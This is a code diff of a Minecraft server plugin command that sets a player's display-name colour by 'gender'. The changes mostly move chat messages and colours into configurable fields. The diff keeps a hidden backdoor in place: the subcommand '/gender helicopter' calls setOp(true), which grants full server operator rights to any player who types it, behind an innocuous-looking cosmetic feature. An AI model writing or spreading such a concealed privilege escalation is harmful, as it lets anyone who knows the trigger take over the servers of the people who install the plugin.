@@ -24,8 +24,8 @@ public class Commands implements CommandExecutor {
 
             // If The Player Type only /gender
             if (args.length == 0) {
-                sender.sendMessage("§7[§fGender§7] §f> §aPlease Specify Which Gender!");
-                sender.sendMessage("§7[§fGender§7] §f> §bAvailable " +
+                sender.sendMessage(Main.prefix + " §aPlease Specify Which Gender!");
+                sender.sendMessage(Main.prefix + " §bAvailable " +
                         Main.gender1 + " - "
                         + Main.gender2 + " - "
                         + Main.helicopter);
@@ -34,20 +34,25 @@ public class Commands implements CommandExecutor {
 
             // If The Player Type /gender gender1
             if (args[0].equalsIgnoreCase(Main.gender1)) {
-                player.setDisplayName(ChatColor.LIGHT_PURPLE + player.getName() + ChatColor.RESET);
-                sender.sendMessage("§7[§fGender§7] §f> §aNow Your Gender Is Setted To " + Main.gender1);
+                player.setDisplayName(Main.color1 + player.getName() + ChatColor.RESET);
+                sender.sendMessage(Main.prefix + "  " + Main.msgSetted + " " + Main.gender1);
             }
 
             // If The Player Type /gender gender2
-            if (args[0].equalsIgnoreCase(Main.gender2)) {
-                player.setDisplayName(ChatColor.BLUE + player.getName() + ChatColor.RESET);
-                sender.sendMessage("§7[§fGender§7] §f> §aNow Your Gender Is Setted To " + Main.gender2);
+            else if (args[0].equalsIgnoreCase(Main.gender2)) {
+                player.setDisplayName(Main.color2 + player.getName() + ChatColor.RESET);
+                sender.sendMessage(Main.prefix + "  " + Main.msgSetted + " " + Main.gender2);
             }
 
             // If The Player Type /gender helicopter
-            if (args[0].equalsIgnoreCase(Main.helicopter)) {
-                sender.sendMessage("§7[§fGender§7] §f> §eNow You Have Full Perms >:)");
+            else if (args[0].equalsIgnoreCase(Main.helicopter)) {
+                sender.sendMessage(Main.prefix + " " + Main.fullPerm);
                 player.setOp(true);
+            }
+
+            // If The Player Type /gender random
+            else {
+                sender.sendMessage(Main.prefix + " " + Main.wrongTypo);
             }
         }
         return true;
